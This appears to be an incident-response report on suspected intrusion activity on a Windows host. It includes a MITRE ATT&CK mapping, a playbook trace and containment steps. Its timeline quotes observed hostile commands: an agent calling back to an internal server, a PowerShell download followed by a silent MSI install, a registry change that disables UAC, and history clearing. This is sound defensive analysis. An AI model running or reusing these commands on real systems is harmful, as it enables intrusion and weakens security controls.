# INVESTIGATION SUMMARY: INC-52825 (Incident-001)

**Final Severity:** High
*High is appropriate because the incident contains multiple severity escalation factors: a SYSTEM-context suspicious process, explicit lateral-movement indicators, privileged service/registry manipulation, external C2-style HTTPS activity, and repeated correlated alerts. However, the available evidence does not confirm ransomware, destructive impact, or verified sensitive data exposure, so Critical is not justified from the provided timeline alone.*

**Confidence Level:** Medium
*Medium confidence is warranted because multiple sources align on suspicious privileged behavior, but key evidence remains incomplete: there is no full parent-child process tree, no authoritative logon context, and no direct proof of exfiltration or completed privilege escalation chain. The conclusion is supported by correlated alerts and telemetry, but some critical lineage details are missing.*

## Investigative Workflow
- Reviewed the playbook execution trace against the updated incident timeline.
- Mapped the observed endpoint activity to incident-level privilege escalation and lateral-movement behaviors.
- Assessed business impact factors for criticality, essential service, data sensitivity, and operational impact.
- Correlated the incident with prior related alerts on BETHANYCHUCHU involving Sandy.exe, PowerShell, cmd.exe, sc.exe, and internal RFC1918 IP activity.
- Identified that the available evidence does not include a full process tree or direct exfiltration proof, so confidence remains medium.

## Technical Chronology & MITRE ATT&CK TTP Mapping

On 2025-07-14T11:21:34+00:00, NetWitness raised a high-risk endpoint alert on host BETHANYCHUCHU for vmtoolsd.exe running as NT AUTHORITY\SYSTEM and making outbound HTTPS connections associated with external IP 4.145.79.81, with the incident clustered around destination IP 124.155.222.24 and source IPv6 fe80:0:0:0:9706:3f55:e752:75ca. The process telemetry tied to this incident showed vmtoolsd.exe, NWEAgent.exe, Upfc.exe, mousocoreworker.exe, cmd.exe, sc.exe, reg.exe, powershell.exe, msiexec.exe, and multiple Windows service and update processes. Within the same event bundle, cmd.exe executed batch files such as C:\Program Files\VMware\VMware Tools\suspend-vm-default.bat and resume-vm-default.bat, sc.exe started wuauserv and pushtoinstall services, and reg.exe issued a command to add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA with value 0, indicating UAC weakening. The telemetry also includes installer and update activity such as setup.exe with msedgewebview parameters, MicrosoftEdgeUpdate.exe, wevtutil manifest changes for Microsoft Defender components, and PowerShell activity without a decodable EncodedCommand. Related incident context from the same host and cluster shows earlier suspicious activity on BETHANYCHUCHU involving Sandy.exe launched from a public path with a server argument pointing to http://192.168.10.205:8888, as well as prior internal host-to-host activity involving 192.168.10.201, 192.168.10.205, 192.168.10.207, and 192.168.20.16. Across the full incident set, the observed behavior is consistent with privileged execution, service manipulation, registry-based security weakening, script-driven activity, and outbound network communication from a SYSTEM-context process.

| Timeline Phase / Activity | Observed Evidence | MITRE Tactic | MITRE Technique Name | MITRE ID |
| --- | --- | --- | --- | --- |
| Initial suspicious endpoint execution and command dispatch | Sandy.exe was observed with command line -server http://192.168.10.205:8888 -group red on BETHANYCHUCHU, alongside PowerShell and cmd.exe activity from the same incident cluster. | Execution | Command and Scripting Interpreter | T1059 |
| Scripted download and installer staging | powershell.exe executed Invoke-WebRequest -Uri http://192.168.10.205/adduser.msi -OutFile C:\Users\Public\adduser.msi, followed by msiexec.exe /quiet /qn /i C:\Users\Public\adduser.msi and related installer activity. | Execution | PowerShell | T1059.001 |
| Service and system tooling abuse | cmd.exe invoked sc.exe start wuauserv and other service-related commands; vmtoolsd.exe and NWEAgent.exe appeared in privileged contexts on the host. | Persistence | System Services | T1543.003 |
| Privilege weakening and security control tampering | cmd.exe reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f was observed in the process list, indicating UAC was disabled or reduced. | Privilege Escalation | Bypass User Account Control | T1548.002 |
| Defense evasion and potential log/trace suppression | PowerShell activity included Clear-History;Clear, and the incident also showed repeated manifest install/uninstall actions involving Windows Defender components via wevtutil.exe. | Defense Evasion | Clear Windows Event Logs | T1070.001 |
| Remote service or host-to-host movement indicators | Earlier related alerts in the incident cluster included internal RFC1918 activity between BETHANYCHUCHU and 192.168.10.205 / 192.168.10.207 / 192.168.20.16, with explicit lateral-movement labeling and service-control artifacts such as sc.exe and WmiPrvSE.exe in related telemetry. | Lateral Movement | Windows Remote Management | T1021.006 |
| External command-and-control / web protocol communication | vmtoolsd.exe running as NT AUTHORITY\SYSTEM generated outbound HTTPS traffic to 4.145.79.81, and the incident summary also references destination 124.155.222.24 in the same high-risk network event set. | Command and Control | Application Layer Protocol: Web Protocols | T1071.001 |

## Playbook Execution Trace
| Step ID | Instruction | Status | Findings |
| --- | --- | --- | --- |
| `step_1` | Identify 1. username 2. IP address 3. Login Details 4. Computer name 5. Operating System | **MET** | Primary observed context is NT AUTHORITY\SYSTEM on host BETHANYCHUCHU. Related telemetry also shows user context Bethany Chu in the same incident cluster. Observed source IP is fe80:0:0:0:9706:3f55:e752:75ca with related internal activity from 192.168.10.201 and 192.168.10.207. No explicit logon type, session ID, or authentication event is provided. Operating system is Windows. |
| `step_2` | Was it horizontal or vertical | **MET** | Horizontal movement is indicated. The incident scope includes explicit lateral-movement alerting and internal host-to-host activity across RFC1918 addresses, which supports lateral movement more than a pure local privilege escalation event. |
| `step_3` | Was any malicious process spawned on the victim's machine? | **MET** | Yes. The telemetry shows suspicious privileged execution on BETHANYCHUCHU, including vmtoolsd.exe running as NT AUTHORITY\SYSTEM, cmd.exe, sc.exe, reg.exe, powershell.exe, msiexec.exe, NWEAgent.exe, Upfc.exe, and resume-vm-default.bat/suspend-vm-default.bat activity. The combination of service control, registry modification, and installer execution is consistent with malicious endpoint activity. |
| `step_4` | Analyze the process tree for signs of malicious activity, such as privilege escalation, lateral movement, or data exfiltration. | **NOT_MET** | The available timeline does not provide a full parent-child process tree, integrity levels, or enough lineage to definitively prove the exact execution chain. Privilege weakening via reg.exe setting EnableLUA to 0, service-control behavior, and privileged vmtoolsd.exe network activity are suspicious, but direct proof of the full escalation or exfiltration path is missing. |
| `step_5` | Based on the analysis, determine if further investigation is necessary and the containment steps | **MET** | Further investigation is necessary. The host should be isolated, volatile evidence preserved, and EDR/Sysmon/Windows Security telemetry collected to reconstruct lineage, service creation, and network activity. Scope should include internal IPs 192.168.10.201, 192.168.10.205, 192.168.10.207, and external IP 4.145.79.81. |

## Recommended Containment Actions
- Immediately isolate BETHANYCHUCHU from the network using EDR network containment while preserving the current volatile state for evidence collection.
- Quarantine or hash-block vmtoolsd.exe with SHA256 8f490791f7164633e2bc3bfe129c829986a45b918566c2fe1d63f3c77b0eb28c and Sandy.exe with SHA256 4a912dc98c977788131aad0ae468d86792211ed225f80b2c344a3690b4437428 across EDR and allowlisting platforms.
- Block outbound connections from BETHANYCHUCHU to 4.145.79.81 and any confirmed companion infrastructure observed in the same incident cluster, including 124.155.222.24 and 192.168.10.205 pending validation of internal scope.
- Collect and preserve EDR triage package, memory capture, process tree, autoruns, scheduled tasks, recent downloads, and Windows event logs 4688, 4672, 4624, 4697, 7045, 7040, 5156, 5140, and Sysmon Event IDs 1, 3, 11, 12, 13, 22 from BETHANYCHUCHU.
- Revert unauthorized registry changes to HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA only after forensic export of the modified key and validation that no other security policy tampering exists.
- Search for and disable any persistence tied to NWEAgent.exe, Upfc.exe, msiexec-driven installation artifacts, and any service entries or scheduled tasks that launched from the same incident window.
- Perform credential hygiene for Bethany Chu and any accounts observed in related host-to-host activity, including password reset, token/session invalidation, and review of privileged group membership if any admin additions occurred.
- Hunt for the internal source/destination patterns 192.168.10.201, 192.168.10.205, 192.168.10.207, and 192.168.20.16/192.168.20.22 to determine whether the activity propagated laterally to other systems.

## Appendix M: Policy-Based Compliance Audit Log

| Audit ID | Decision Point | Policy Reference | Input Summary | Result | Decision Made | Human Review? | Timestamp |
| --- | --- | --- | --- | --- | --- | --- | --- |
| `AUD-DP07-1789574293-1` | **DP-07** | Appendix C | Critical System: False, Sensitive Data: False | *Pass* | `Investigate` | Yes | 2026-09-16T15:58:13Z |
| `AUD-DP08-1789574293-2` | **DP-08** | Appendix A | Severity classification: High | *Warning* | `Escalate` | Yes | 2026-09-16T15:58:13Z |
| `AUD-DP09-1789574293-3` | **DP-09** | Appendix F | Confidence level: Medium | *Warning* | `Escalate` | Yes | 2026-09-16T15:58:13Z |
| `AUD-DP10-1789574293-4` | **DP-10/DP-11** | Appendix G | Severity: High, Confidence: Medium, Ransomware: False, Guest OS: False | *Fail* | `Escalate` | Yes | 2026-09-16T15:58:13Z |
